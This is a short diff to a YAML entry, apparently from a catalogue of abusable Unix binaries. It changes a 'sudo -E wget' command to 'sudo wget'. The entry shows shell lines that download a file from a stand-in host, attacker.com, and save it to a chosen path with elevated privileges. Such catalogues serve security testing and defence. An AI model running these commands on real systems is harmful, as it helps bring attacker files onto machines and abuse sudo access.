@@ -23,5 +23,5 @@ functions:
       code: |
         export URL=http://attacker.com/file_to_get
         export LFILE=file_to_save
-        sudo -E wget $URL -O $LFILE
+        sudo wget $URL -O $LFILE
 ---
